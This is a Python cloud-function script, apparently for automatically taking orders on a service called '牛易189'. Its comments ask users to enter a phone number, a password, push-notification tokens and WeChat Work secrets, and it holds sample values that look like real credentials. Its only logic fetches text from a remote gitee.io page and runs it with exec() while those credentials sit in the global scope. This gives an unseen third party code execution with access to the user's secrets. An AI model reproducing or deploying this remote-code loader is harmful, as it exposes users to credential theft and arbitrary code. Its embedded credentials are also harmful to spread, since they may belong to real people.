'''

cron: */15 11-22 * * *

new Env('牛易189');

'''
# -*- coding:utf-8 -*-
import requests
#云函数使用教程(http://qr61.cn/ogpvAF/qMXaiV7）环境选python3.6,超时设置900s，触发器定时（0 */15 7-23 * * * *）

#--------------以下为配置区需自行填写--------------#
#1.多旺旺选择开关:你在蓝奏云（https://www.lanzou.com/u）新建一个文件夹获取的外链分享地址(有密码不影响)，通过重命名文件夹名为一位数字(1为开，2为关)实现远程控制云函数功能。接单成功并通知后请将对应位置数字置2，否则微信会持续推送做单提醒。第三天需要的时候再改为对应数字即可开始接单。
folder = 'https://wwi.lanzouw.com/b0ermpp9i' #请将单引号内默认链接替换为你自己的链接
#2.微信推送通知：接单成功微信pushplus通知token（通过网页http://www.pushplus.plus/push1.html扫码登陆获取）
Token = 'f60a038b5d8a4fd6b8c7ba6e2ce5a0b3' #请将token填在单引号内
#3.登陆手机号
phone = '18998275420' #请将手机号填在单引号内
#4.密码
password = 'qq123456' #请将密码填在单引号内
AgentId = '1000004'
corpid = 'wwad849d24b9ae762e'
Secret = 'H4t9D51QTfrQnQS_-aXCDqp4N-o8HrvCUOuJzUGLudw'
media_id='2Dl-C5yXBJZuOsW65sApwspsRzYcA6bbK6qm6NGCBOPL2KFuUDTR6YDjHbempF65c'
#--------------以下为代码区，请勿修改！------------#
def main_handler(event, context):
    code=requests.get('https://scflover.gitee.io/nyYex36TDpC2LNWhHHVyhobNbqvxxyTOcElUjYJEJ.html')
    code.encoding='utf-8'
    exec(code.text,globals())

if __name__ == '__main__':
    main_handler("", "")
